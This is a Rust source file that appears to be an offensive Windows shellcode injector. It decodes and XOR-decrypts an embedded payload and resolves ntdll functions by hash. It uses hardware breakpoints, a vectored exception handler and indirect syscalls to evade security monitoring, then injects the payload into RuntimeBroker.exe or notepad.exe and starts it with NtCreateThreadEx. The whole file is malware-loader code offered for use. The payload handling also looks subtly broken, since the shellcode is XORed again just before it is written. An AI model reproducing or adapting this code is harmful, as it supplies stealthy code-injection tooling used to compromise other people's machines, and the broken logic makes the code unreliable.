#![allow(non_snake_case)]
#![allow(non_camel_case_types)]

mod core;
mod evasion;
mod utils;

use std::ptr::null_mut;
use std::sync::atomic::Ordering;
use base64::{Engine as _, engine::general_purpose};
use windows::Win32::Foundation::{HANDLE, HINSTANCE, CloseHandle};
use windows::Win32::System::Threading::{
    GetCurrentThread, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD,
};
use windows::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, CONTEXT, CONTEXT_FLAGS, GetThreadContext, SetThreadContext,
};
use windows::Win32::System::ProcessStatus::{EnumProcesses, GetModuleBaseNameA};

use crate::core::peb::{get_module_base_by_hash, get_export_address_by_hash};
use crate::core::syscalls::{veh_handler, resolve_ssn, SYSCALL_MAP, SYSCALL_RET};
use crate::evasion::obfuscation::{xor_obfuscate, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx};
use crate::utils::hash::dbj2_hash;

unsafe fn set_hwbp(address: usize, index: usize) {
    let mut context = CONTEXT::default();
    context.ContextFlags = CONTEXT_FLAGS(0x00100010); // CONTEXT_DEBUG_REGISTERS
    let thread = GetCurrentThread();
    let _ = GetThreadContext(thread, &mut context);
    match index {
        0 => context.Dr0 = address as u64,
        1 => context.Dr1 = address as u64,
        2 => context.Dr2 = address as u64,
        3 => context.Dr3 = address as u64,
        _ => return,
    }
    context.Dr7 |= 1 << (index * 2);
    context.Dr7 &= !(0xF << (16 + index * 4));
    let _ = SetThreadContext(thread, &context);
}

fn get_pid(name: &str) -> Option<u32> {
    let mut processes = [0u32; 1024];
    let mut cb = 0u32;
    unsafe {
        if EnumProcesses(processes.as_mut_ptr(), 4096, &mut cb).is_ok() {
            for i in 0..(cb/4) {
                if processes[i as usize] == 0 { continue; }
                if let Ok(h) = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, processes[i as usize]) {
                    let mut bname = [0u8; 260];
                    if GetModuleBaseNameA(h, HINSTANCE(0), &mut bname) > 0 {
                        let n_str = std::str::from_utf8(&bname).unwrap_or("").to_lowercase();
                        if n_str.contains(&name.to_lowercase()) {
                            let _ = CloseHandle(h); return Some(processes[i as usize]);
                        }
                    }
                    let _ = CloseHandle(h);
                }
            }
        }
    }
    None
}

fn main() {
    let shellcode_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
    let mut shellcode = general_purpose::STANDARD.decode(shellcode_b64).expect("Base64 Failed");
    let key = b"STEALTH_ULTIMATE_2026";
    xor_obfuscate(&mut shellcode, key);

    unsafe {
        let ntdll = get_module_base_by_hash(dbj2_hash("ntdll.dll")).expect("ntdll failed");

        let _ = AddVectoredExceptionHandler(1, Some(veh_handler));

        let nt_alert_hash = dbj2_hash("NtTestAlert");
        if let Some(addr) = get_export_address_by_hash(ntdll, nt_alert_hash) {
            let mut ptr = addr as *const u8;
            for _ in 0..1000 {
                if *ptr == 0x0f && *ptr.add(1) == 0x05 && *ptr.add(2) == 0xc3 {
                    SYSCALL_RET.store(ptr as usize, Ordering::Relaxed);
                    break;
                }
                ptr = ptr.add(1);
            }
        }

        let names = vec!["NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"];
        let mut addrs = std::collections::HashMap::new();
        for (i, name) in names.iter().enumerate() {
            let addr = get_export_address_by_hash(ntdll, dbj2_hash(name)).expect("Export failed");
            let ssn = resolve_ssn(addr).expect("SSN failed");
            SYSCALL_MAP[i].0.store(addr as usize, Ordering::Relaxed);
            SYSCALL_MAP[i].1.store(ssn as usize, Ordering::Relaxed);
            set_hwbp(addr as usize, i);
            addrs.insert(name.to_string(), addr);
        }

        if let Some(pid) = get_pid("RuntimeBroker.exe").or_else(|| get_pid("notepad.exe")) {
            println!("[+] Target PID: {}", pid);
            let hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, pid).unwrap();

            let (mut base, mut size) = (null_mut(), shellcode.len());
            std::mem::transmute::<_, NtAllocateVirtualMemory>(*addrs.get("NtAllocateVirtualMemory").unwrap())(hp, &mut base, 0, &mut size, 0x3000, 0x04);

            xor_obfuscate(&mut shellcode, key);
            let mut written = 0;
            std::mem::transmute::<_, NtWriteVirtualMemory>(*addrs.get("NtWriteVirtualMemory").unwrap())(hp, base, shellcode.as_ptr() as _, shellcode.len(), &mut written);

            let mut old = 0;
            std::mem::transmute::<_, NtProtectVirtualMemory>(*addrs.get("NtProtectVirtualMemory").unwrap())(hp, &mut base, &mut size, 0x20, &mut old);

            let mut ht = HANDLE(0);
            std::mem::transmute::<_, NtCreateThreadEx>(*addrs.get("NtCreateThreadEx").unwrap())(&mut ht, 0x1FFFFF, null_mut(), hp, base, null_mut(), 0, 0, 0, 0, null_mut());

            println!("[+] Professional 2026 Stealth Injection Complete.");
            let _ = CloseHandle(hp);
        }
    }
}
